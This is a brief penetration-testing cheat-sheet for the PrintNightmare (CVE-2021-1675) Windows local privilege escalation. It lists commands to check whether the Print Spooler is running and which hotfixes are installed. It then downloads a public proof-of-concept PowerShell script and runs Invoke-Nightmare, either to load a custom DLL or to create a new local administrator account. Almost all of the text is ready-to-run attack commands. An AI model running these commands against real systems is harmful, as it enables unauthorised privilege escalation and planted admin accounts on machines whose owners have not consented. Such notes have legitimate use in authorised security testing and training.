# PrintNightmare - LPE

## Check if vulnerable to PrintNightmare

```powershell
Get-Service -Name Spooler
Get-HotFix | findstr "Security"
```


Hotfix:

```text
KB5004945   <-- Win10 PrintNightmare fix
KB5004237   <-- Win10 PrintNightmare fix
```

## Exploit

Download files:

```bash
wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
```

### Run exploit

with custom DLL:

```powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -DLL "C:\DLL_ABSOLUTE_PATH.dll"
```

Add local admin:

```powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -DriverName "Xerox" -NewUser "USERNAME" -NewPassword "PASSWORD"
```
